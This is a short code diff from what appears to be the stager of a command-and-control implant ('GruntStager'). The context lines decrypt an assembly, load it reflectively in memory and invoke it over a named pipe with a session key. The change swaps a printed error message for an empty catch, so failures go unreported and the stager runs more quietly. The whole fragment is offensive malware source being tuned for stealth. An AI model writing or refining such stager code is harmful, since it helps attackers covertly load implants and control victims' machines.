@@ -138,7 +138,7 @@ namespace GruntStager
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                 gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { GUID, SessionKey, pipe, PipeName });
             }
-            catch (Exception e) { Console.Error.WriteLine(e.Message); }
+            catch { }
         }
 
         public static void Write(PipeStream pipe, byte[] bytes)
